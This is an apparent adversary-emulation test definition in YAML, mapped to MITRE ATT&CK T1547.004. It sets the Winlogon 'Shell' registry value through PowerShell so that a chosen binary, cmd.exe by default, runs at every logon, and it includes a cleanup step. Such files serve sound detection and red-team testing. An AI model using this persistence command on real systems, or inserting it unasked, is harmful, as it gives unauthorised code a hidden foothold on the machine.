api_version: "2.0"
name: Winlogon HKLM Shell Key Persistence - PowerShell
description: |
    PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.

    Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.
args:
    - name: binary_to_execute
      type: path
      default: C:\Windows\System32\cmd.exe
uuid: 95a3c42f-8c88-4952-ad60-13b81d929a9d
mitre:
    tactics:
        - 'TA0003: Persistence'
        - 'TA0004: Privilege Escalation'
    techniques:
        - 'T1547: Boot or Logon Autostart Execution'
    subtechniques:
        - 'T1547.004: Winlogon Helper DLL'
requirements:
    platforms:
        - os: windows
steps:
    - name: winlogon-hklm-shell-key-persistence---powershell
      inline: |
        Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, {{.Args.binary_to_execute}}" -Force
      executor: powershell
      cleanup:
        inline: |
            Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -Force -ErrorAction Ignore
        executor: powershell
